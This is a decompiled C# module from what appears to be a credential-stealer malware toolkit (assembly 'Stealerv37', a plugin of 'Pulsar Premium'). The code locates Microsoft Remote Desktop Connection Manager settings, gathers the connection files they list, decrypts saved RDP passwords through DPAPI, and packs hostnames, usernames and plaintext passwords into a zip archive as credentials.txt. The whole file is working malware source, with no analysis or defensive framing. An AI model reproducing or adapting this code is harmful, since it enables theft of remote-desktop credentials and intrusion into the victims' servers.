// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Applications.RDCMan
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Xml;

#nullable disable
namespace Intelix.Targets.Applications;

public class RDCMan : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string path1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Remote Desktop Connection Manager", "RDCMan.settings");
    if (!File.Exists(path1))
      return;
    List<string> source = new List<string>();
    XmlDocument xmlDocument1 = new XmlDocument();
    xmlDocument1.LoadXml(File.ReadAllText(path1));
    XmlNodeList xmlNodeList1 = xmlDocument1.SelectNodes("//FilesToOpen");
    if (xmlNodeList1 != null)
    {
      foreach (XmlNode xmlNode in xmlNodeList1)
      {
        string innerText = xmlNode.InnerText;
        if (!string.IsNullOrEmpty(innerText) && !source.Contains(innerText))
          source.Add(innerText);
      }
    }
    if (!source.Any<string>())
      return;
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (RDCMan);
    StringBuilder stringBuilder = new StringBuilder();
    foreach (string path2 in source)
    {
      if (File.Exists(path2))
      {
        string entryPath1 = "RDCMan\\" + Path.GetFileName(path2);
        zip.AddFile(entryPath1, File.ReadAllBytes(path2));
        counterApplications.Files.Add($"{path2} => {entryPath1}");
        XmlDocument xmlDocument2 = new XmlDocument();
        xmlDocument2.LoadXml(File.ReadAllText(path2));
        XmlNodeList xmlNodeList2 = xmlDocument2.SelectNodes("//server");
        if (xmlNodeList2 != null && xmlNodeList2.Count != 0)
        {
          stringBuilder.AppendLine("SourceFile: " + path2);
          stringBuilder.AppendLine($"Found servers: {xmlNodeList2.Count}");
          stringBuilder.AppendLine();
          foreach (XmlNode xmlNode1 in xmlNodeList2)
          {
            string str1 = string.Empty;
            string str2 = string.Empty;
            string str3 = string.Empty;
            string password = string.Empty;
            string str4 = string.Empty;
            foreach (XmlNode xmlNode2 in xmlNode1)
            {
              foreach (XmlNode xmlNode3 in xmlNode2)
              {
                switch (xmlNode3.Name)
                {
                  case "name":
                    str1 = xmlNode3.InnerText;
                    continue;
                  case "profileName":
                    str2 = xmlNode3.InnerText;
                    continue;
                  case "userName":
                    str3 = xmlNode3.InnerText;
                    continue;
                  case "password":
                    password = xmlNode3.InnerText;
                    continue;
                  case "domain":
                    str4 = xmlNode3.InnerText;
                    continue;
                  default:
                    continue;
                }
              }
            }
            if (!string.IsNullOrEmpty(password))
            {
              string str5 = this.DecryptPassword(password);
              stringBuilder.AppendLine("----");
              stringBuilder.AppendLine("HostName: " + str1);
              stringBuilder.AppendLine("ProfileName: " + str2);
              stringBuilder.AppendLine("UserName: " + (string.IsNullOrEmpty(str4) ? str3 : $"{str4}\\{str3}"));
              stringBuilder.AppendLine("DecryptedPassword: " + str5);
              stringBuilder.AppendLine();
            }
          }
          string entryPath2 = $"RDCMan\\{Path.GetFileName(path2)}\\credentials.txt";
          zip.AddTextFile(entryPath2, stringBuilder.ToString());
          counterApplications.Files.Add(entryPath2 ?? "");
        }
      }
    }
    if (counterApplications.Files.Count <= 0)
      return;
    counterApplications.Files.Add("RDCMan\\");
    counter.Applications.Add(counterApplications);
  }

  private string DecryptPassword(string password)
  {
    byte[] bytes = DpApi.Decrypt(Convert.FromBase64String(password));
    return bytes == null ? string.Empty : Encoding.UTF8.GetString(bytes).TrimEnd(new char[1]);
  }
}
